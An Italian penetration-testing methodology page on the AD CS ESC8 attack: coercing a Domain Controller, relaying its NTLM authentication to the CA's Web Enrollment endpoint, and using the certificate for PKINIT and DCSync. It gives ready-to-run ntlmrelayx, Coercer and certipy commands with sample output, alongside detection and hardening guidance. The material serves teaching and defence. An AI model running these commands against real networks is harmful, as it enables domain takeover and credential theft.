> [English](README.en.md) | **Italiano**

# AD CS ESC8: NTLM relay verso il Web Enrollment e compromissione del dominio

> - **Fase:** Credential Access / Privilege Escalation (dominio Active Directory)
> - **Visibilita:** Media-Alta - la coercizione genera traffico RPC anomalo verso l'attaccante; l'emissione del certificato lascia traccia nel database della CA (richiesta da un principal inatteso)
> - **Prerequisiti:** presenza di AD CS con endpoint di Web Enrollment HTTP(S) attivo (`/certsrv`); posizione di rete che permetta di coercere un'autenticazione (es. da un Domain Controller) e di rilanciarla; nessuna credenziale privilegiata richiesta per lo scenario base
> - **Tecnica:** `AD CS ESC8` | **Severity tipica:** `Critico` | **Finding ID:** da assegnare in lab (pagina in metodologia)

- Natura del documento: metodologia. Output illustrativi e rappresentativi, non da lab specifico; identificativi (certificati, hash) troncati o segnaposto.
- Obiettivo: ottenere un certificato di autenticazione per conto di un account privilegiato (tipicamente l'account macchina di un Domain Controller) combinando coercizione e NTLM relay, e usarlo per arrivare al dominio completo.

---

## Executive Summary

ESC8 e una delle misconfigurazioni di Active Directory Certificate Services catalogate nella ricerca
"Certified Pre-Owned" (Schroeder, Christensen 2021). Combina due debolezze indipendenti: l'endpoint di Web
Enrollment di AD CS (`http://ca/certsrv/`) accetta autenticazione NTLM, e NTLM per default non lega
l'autenticazione al canale su cui avviene (manca Extended Protection for Authentication). Un attaccante in
posizione di rete coerce un account privilegiato - tipicamente un Domain Controller - a autenticarsi verso
di se, poi rilancia (relay) quell'autenticazione all'endpoint HTTP della CA chiedendo un certificato per
conto della vittima.

Il certificato ottenuto consente l'autenticazione Kerberos via PKINIT come la vittima. Se la vittima e
l'account macchina di un DC, l'attaccante ne ottiene di fatto i privilegi, aprendo la strada al DCSync e
quindi al dominio completo. A differenza di una password compromessa, il certificato resta valido anche
dopo il reset della password dell'account: ne deriva una persistenza che le contromisure basate su
password non eliminano.

## Contesto operativo (perche, prima del come)

ESC8 e diventato un vettore di riferimento perche non richiede credenziali privilegiate e sfrutta
componenti presenti in moltissimi domini (AD CS con Web Enrollment e spesso installato di default o per
esigenze applicative). Il percorso e interamente basato su funzionalita legittime: la coercizione usa RPC
esposti (MS-EFSRPC, MS-RPRN), il relay usa l'assenza di binding di NTLM, l'emissione del certificato usa un
template valido.

La decisione operativa principale e quale vittima coercere e quale template richiedere. Coercere un DC e
l'opzione a piu alto impatto (porta direttamente ai segreti del dominio), ma qualunque account macchina
privilegiato puo essere utile. La scelta del template (es. uno che consenta Client Authentication) dipende
da cosa la CA espone.

## Esecuzione / Comandi

Lo scenario base richiede tre componenti in sequenza: un listener di relay puntato alla CA, un trigger di
coercizione, e infine l'uso del certificato ottenuto.

### Fase 1 - Relay verso l'endpoint AD CS

```bash
# ntlmrelayx in ascolto: rilancia l'autenticazione ricevuta verso il Web Enrollment della CA,
# richiedendo un certificato con un template che consenta l'autenticazione client
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### Fase 2 - Coercizione dell'autenticazione

```bash
# Induce il Domain Controller ad autenticarsi verso l'host dell'attaccante (che e il relay).
# Esistono piu vettori di coercizione (MS-EFSRPC, MS-RPRN); si usa quello disponibile
Coercer coerce -l <IP_attaccante> -t <IP_domain_controller> -u utente -p 'Password123' -d corp.local
```

Output illustrativo (lato ntlmrelayx, rappresentativo):

```
[*] Authenticating against http://ca01.corp.local as CORP/DC01$ SUCCEED
[*] GOT CERTIFICATE! ID 1337
[*] Base64 certificate of user DC01$:            <-- certificato per l'account macchina del DC
MIIR...[TRONCATO]...==
```

### Fase 3 - Uso del certificato (PKINIT)

```bash
# Autenticazione Kerberos con il certificato ottenuto: restituisce un TGT per l'account vittima,
# e puo recuperare l'hash NT dell'account (UnPAC-the-hash)
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
```

Output illustrativo:

```
[*] Got TGT for 'DC01$@CORP.LOCAL'
[*] Got NT hash for 'DC01$@CORP.LOCAL': <HASH_TRONCATO>   <-- credenziali dell'account macchina del DC
```

Con le credenziali dell'account macchina del DC, il passo successivo tipico e il DCSync (vedi
[05-credential-dumping/dcsync](<../../05-credential-dumping/dcsync/README.md>)).

## Analisi dei risultati

Il risultato non e "una password" ma un'identita crittografica: un certificato valido per l'account del
DC. Questo cambia la natura del compromesso rispetto a un furto di password. Primo, il certificato
autentica via PKINIT indipendentemente dalla password, quindi sopravvive al reset di quest'ultima.
Secondo, l'account macchina di un DC ha, per definizione, i diritti di replica: da qui il DCSync e
immediato. La severity e `Critico` perche l'esito pratico, nello scenario DC, e la compromissione totale
del dominio a partire da una posizione di rete senza privilegi.

### Analisi Teorica

ESC8 e la composizione di due violazioni (vedi [THEORETICAL-FOUNDATIONS](<../../THEORETICAL-FOUNDATIONS.md>),
sezioni 3.4 e 2). La prima e la violazione della proprieta P4 (binding dell'autenticazione al canale): NTLM
e un protocollo challenge-response che non lega la risposta al canale, per cui un relay la riusa identica
verso un target diverso. La seconda e la violazione della proprieta P3 (confinamento dell'autorita): la CA
emette un certificato per conto del principal autenticato senza distinguere un'autenticazione diretta da
una rilanciata, e il Web Enrollment accetta NTLM. La coercizione (T1187) e il motore che fornisce al relay
un'autenticazione privilegiata da riusare.

La scelta di coercere un DC rispetto a un altro account dipende dall'obiettivo: il DC massimizza l'impatto
perche porta direttamente ai diritti di replica. In ambienti in cui il Web Enrollment e esposto in HTTPS
con Channel Binding (EPA) attivo, il relay fallisce: ed e esattamente la contromisura teoricamente prevista
dalla proprieta P4.

## Remediation (Blue Team)

**Rilevamento (SOC/SIEM).**

- Richieste di certificato nel database della CA emesse per account macchina (es. un DC) in contesti
  inattesi: un DC non richiede normalmente certificati tramite il Web Enrollment HTTP.
- Traffico di coercizione: chiamate RPC MS-EFSRPC/MS-RPRN da e verso host inattesi; Event ID di accesso
  seguiti da richieste HTTP verso `/certsrv`.
- Autenticazioni NTLM verso l'endpoint della CA provenienti da host che non sono client di enrollment
  legittimi.

**Hardening.**

- Abilitare Extended Protection for Authentication (EPA) e richiedere HTTPS sull'endpoint di Web
  Enrollment: lega l'autenticazione al canale TLS e neutralizza il relay (contromisura diretta a P4).
- Disabilitare NTLM sull'endpoint AD CS, o rimuovere il ruolo Web Enrollment se non necessario.
- Mitigare la coercizione: patch e hardening dei servizi RPC sfruttabili, filtraggio del traffico RPC non
  necessario verso i DC.
- Abilitare SMB/LDAP signing a livello di dominio come difesa in profondita contro il relay.

---

## Scenario Reale: Proiezione Post-Exploitation

> Come ESC8 si inserirebbe in un engagement reale, dal punto di vista dell'attaccante e del difensore.

### Prospettiva Attaccante (Red Team)

**Punto di partenza:** posizione di rete interna; AD CS con Web Enrollment HTTP individuato; nessuna
credenziale privilegiata.

**Passo successivo immediato:** avviare il relay verso la CA e coercere l'autenticazione del DC per
ottenere un certificato a suo nome.

**Kill Chain proiettata:**

```
Posizione di rete (nessun privilegio)
        |
        v
Coercizione del DC (MS-EFSRPC/MS-RPRN) + NTLM relay verso /certsrv (ESC8)
        |
        v
Certificato per l'account macchina del DC -> PKINIT -> hash NT del DC
        |
        v
DCSync -> dump di tutti gli hash del dominio, incluso krbtgt
        |
        v
Golden Ticket -> persistenza di dominio; il certificato resta valido anche dopo reset password
```

**Impatto potenziale:** compromissione totale del dominio partendo da una semplice presenza in rete. La
persistenza basata su certificato e particolarmente insidiosa perche sopravvive al reset delle password.

**Vettori di monetizzazione tipici:**
- Ransomware enterprise a valle del controllo del dominio.
- Esfiltrazione massiva di dati con privilegi di dominio.
- Access brokering dell'accesso Domain Admin ottenuto.

### Prospettiva Difensore (Blue Team)

**Rilevamento:** richieste di certificato per account macchina privilegiati da canali inattesi; picchi di
coercizione RPC; autenticazioni NTLM verso `/certsrv` da origini non legittime.

**Indicatori di Compromissione (IOC):**
- Entry nel database della CA: certificato emesso per `DC01$` (o altro account privilegiato) tramite Web
  Enrollment.
- Traffico MS-EFSRPC/MS-RPRN verso i DC da host non amministrativi.
- Uso successivo di PKINIT da host inatteso seguito da attivita di replica (DCSync).

**Contenimento:** revoca del certificato emesso in modo anomalo; isolamento dell'host di relay; reset di
krbtgt (due volte) se si sospetta un Golden Ticket; indagine sulle repliche recenti.

**Eradicazione e hardening:** EPA + HTTPS sul Web Enrollment, o rimozione del ruolo; disabilitazione di
NTLM verso la CA; mitigazione della coercizione; signing SMB/LDAP.

**Lezione difensiva:** l'autenticazione non legata al canale (NTLM senza EPA) e un rischio sistemico quando
un servizio sensibile come la CA la accetta. La difesa non e "rendere NTLM piu forte" ma legare
l'autenticazione al canale e confinare l'autorita di emissione dei certificati.

---

## Tool di riferimento

| Tool | Tipo | Tecnica/Accesso | Caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `Certipy` | AD CS toolkit | CLI - Attivo | Enumerazione AD CS, identificazione ESC, autenticazione PKINIT con certificato |
| `ntlmrelayx.py` (Impacket) | Relay toolkit | CLI - Attivo | Relay dell'autenticazione NTLM verso il Web Enrollment della CA (`--adcs`) |
| `Coercer` | Coercion toolkit | CLI - Attivo | Coercizione multi-protocollo dell'autenticazione (MS-EFSRPC, MS-RPRN, ...) |
| `PetitPotam` | Coercion PoC | CLI - Attivo | Coercizione via MS-EFSRPC, vettore classico abbinato a ESC8 |
| `Certify` | .NET AD CS tool | CLI - Attivo | Enumerazione e abuso AD CS da host Windows |
| `Rubeus` | .NET Kerberos tool | CLI - Attivo | Uso del certificato per richiedere TGT (PKINIT) da Windows |

---

## Note di metodologia

In un lab reale (es. GOAD, che include scenari AD CS) i punti da documentare come finding sarebbero: quale
vettore di coercizione funziona contro la configurazione del DC, quale template la CA espone come
sfruttabile, e l'esito del PKINIT (TGT e/o hash NT). Andrebbe inoltre verificato se EPA/HTTPS sono attivi,
perche determinano il fallimento o il successo del relay. Questi esiti, una volta osservati, diventano il
finding reale (`AD-NNN`).

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Credential Access | Steal or Forge Authentication Certificates | `T1649` | Ottenimento di un certificato di autenticazione per conto di un account privilegiato tramite AD CS. |
| Credential Access | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | `T1557.001` | Relay dell'autenticazione NTLM coercita verso l'endpoint di Web Enrollment. |
| Credential Access | Forced Authentication | `T1187` | Coercizione del Domain Controller ad autenticarsi verso l'host di relay (MS-EFSRPC/MS-RPRN). |
| Credential Access | OS Credential Dumping: DCSync | `T1003.006` | Follow-on: uso delle credenziali del DC per la replica abusata. |

---

## Correlazioni con altri moduli

| Provenienza | Questa tecnica | Effetto |
| :--- | :--- | :--- |
| Posizione di rete interna / recon ([01-recon](<../../../01-recon (Red Team Basic)/README.md>)) | ESC8 | individuazione dell'endpoint AD CS e dei DC da coercere |
| ESC8 | [DCSync](<../../05-credential-dumping/dcsync/README.md>) | le credenziali del DC ottenute abilitano la replica abusata |
| ESC8 | NTLM relay generico (modulo 07 / tecniche di rete) | stessa primitiva di relay applicata a un target ad alto valore (la CA) |

---

> **Nota:** Tutte le tecniche descritte sono a scopo didattico e di documentazione di metodologia. Vanno
> eseguite esclusivamente in laboratori di proprieta o su sistemi con autorizzazione esplicita. Gli output
> sono illustrativi e non provengono da sistemi reali o di terze parti.
